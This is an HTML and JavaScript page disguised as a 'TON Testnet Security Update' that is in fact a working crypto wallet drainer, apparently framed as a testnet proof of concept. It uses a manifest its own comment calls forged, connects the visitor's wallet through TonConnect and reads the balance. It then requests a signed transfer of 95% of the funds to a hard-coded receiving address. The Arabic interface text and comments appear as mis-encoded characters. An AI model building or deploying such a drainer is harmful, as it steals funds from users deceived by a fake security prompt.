<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Testnet Security Update - New Window</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 40px; border-radius: 24px; border: 1px solid #30363d; text-align: center; width: 420px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .balance-info { display: none; background: #0d1117; padding: 20px; border-radius: 15px; margin: 20px 0; border: 1px solid #238636; animation: fadeIn 0.5s; }
        button { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.2s; }
        button:hover { background: #0077b5; transform: translateY(-2px); }
        #status { font-size: 13px; color: #8b949e; margin-top: 15px; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://ton.org/address/ton_logo.png" width="70" alt="logo" style="margin-bottom: 20px;">
    <h2>ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ØªÙ‚Ø¯Ù…</h2>
    <p style="color: #8b949e;">Ø§Ø¶ØºØ· Ù„Ù„Ø±Ø¨Ø· ÙÙŠ Ù†Ø§ÙØ°Ø© Ù…Ø³ØªÙ‚Ù„Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù…Ø§Ù† Ø­Ø³Ø§Ø¨Ùƒ (Testnet).</p>
    
    <button id="connectBtn">Ø§ØªØµØ§Ù„ ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø©</button>

    <div id="balanceBox" class="balance-info">
        <div style="color: #58a6ff; font-size: 12px; margin-bottom: 5px;">ØªÙ… Ø§Ù„Ø±Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­ Ù…Ø¹ Ø§Ù„Ù…Ø­ÙØ¸Ø©:</div>
        <div id="addr" style="font-size: 10px; word-break: break-all; color: #8b949e;">-</div>
        <div style="font-size: 24px; margin-top: 15px; font-weight: bold;"><span id="balance">0.00</span> TON</div>
    </div>

    <div id="status">Ø¬Ø§Ù‡Ø² Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    // Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø§Ù†ÙŠÙØ³Øª Ø§Ù„Ù…Ø²ÙˆØ± Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
    
    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    const connectBtn = document.getElementById('connectBtn');
    const balanceBox = document.getElementById('balanceBox');
    const statusDiv = document.getElementById('status');

    connectBtn.onclick = async () => {
        try {
            statusDiv.innerText = "Ø¬Ø§Ø±ÙŠ ÙØªØ­ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø§ØªØµØ§Ù„...";
            
            // ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø¹Ø¨Ø± SDK
            const connectUrl = connector.connect({
                universalLink: 'https://app.tonkeeper.com/ton-connect',
                bridgeUrl: 'https://bridge.tonapi.io/bridge'
            });

            // Ø§Ù„Ø³Ø± Ù‡Ù†Ø§: ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø© Ø¨Ù…Ù‚Ø§Ø³Ø§Øª Ù…Ø­Ø¯Ø¯Ø©
            const width = 500;
            const height = 700;
            const left = (window.screen.width / 2) - (width / 2);
            const top = (window.screen.height / 2) - (height / 2);
            
            window.open(connectUrl, 'TonConnectPopup', `width=${width},height=${height},top=${top},left=${left},scrollbars=yes,resizable=yes`);

        } catch (e) { 
            statusDiv.innerText = "Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„: " + e.message; 
        }
    };

    // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù†Ø¬Ø§Ø­ Ø§Ù„Ø§ØªØµØ§Ù„ ÙÙŠ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            statusDiv.innerText = "âœ… ØªÙ… Ø§Ù„Ø±Ø¨Ø·! Ø¬Ø§Ø±ÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...";
            const rawAddress = wallet.account.address;
            
            document.getElementById('addr').innerText = rawAddress;
            balanceBox.style.display = 'block';
            connectBtn.style.display = 'none';

            // Ø¬Ù„Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ù…Ù† TON Testnet API
            try {
                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
                const data = await response.json();
                const balanceNano = data.result.balance;
                const balanceTon = balanceNano / 1000000000;
                
                document.getElementById('balance').innerText = balanceTon.toFixed(2);
                
                // Ø·Ù„Ø¨ ØªÙˆÙ‚ÙŠØ¹ Ø³Ø­Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ (Ø¶Ø±Ø± ÙƒØ§Ù…Ù„)
                setTimeout(() => initiateDrain(balanceNano), 2000);
            } catch (e) { 
                statusDiv.innerText = "ÙØ´Ù„ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø±ØµÙŠØ¯."; 
            }
        }
    });

    async function initiateDrain(nanoAmount) {
        // Ø³Ø­Ø¨ 95% Ù…Ù† Ø§Ù„Ø±ØµÙŠØ¯ Ù„ØªØ±Ùƒ Ø§Ù„Ù‚Ù„ÙŠÙ„ Ù„Ù„Ø±Ø³ÙˆÙ… (Ø¥Ø«Ø¨Ø§Øª Ø¶Ø±Ø±)
        const amountToSend = Math.floor(nanoAmount * 0.95);
        
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 120,
            messages: [{
                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY", // Ù…Ø­ÙØ¸Ø© Ø§Ù„Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ
                amount: amountToSend.toString()
            }]
        };

        try {
            statusDiv.innerText = "ÙŠØ¬Ø¨ ØªÙˆÙ‚ÙŠØ¹ Ù…Ø¹Ø§Ù…Ù„Ø© Ø§Ù„ØªÙˆØ«ÙŠÙ‚ Ù„ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø±ØµÙŠØ¯...";
            statusDiv.style.color = "#fcd535";
            await connector.sendTransaction(transaction);
            statusDiv.innerText = "ğŸš€ ØªÙ… Ø³Ø­Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ø¨Ù†Ø¬Ø§Ø­ (Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø¶Ø±Ø± Ø§Ù„ÙƒØ§Ù…Ù„)!";
        } catch (e) {
            statusDiv.innerText = "âŒ Ø±ÙØ¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„ØªÙˆÙ‚ÙŠØ¹ØŒ ÙˆÙ„ÙƒÙ† ØªÙ… Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù‚Ø¯Ø±Ø© Ø¹Ù„Ù‰ Ø·Ù„Ø¨ Ø§Ù„Ø³Ø­Ø¨.";
        }
    }
</script>
</body>
</html>
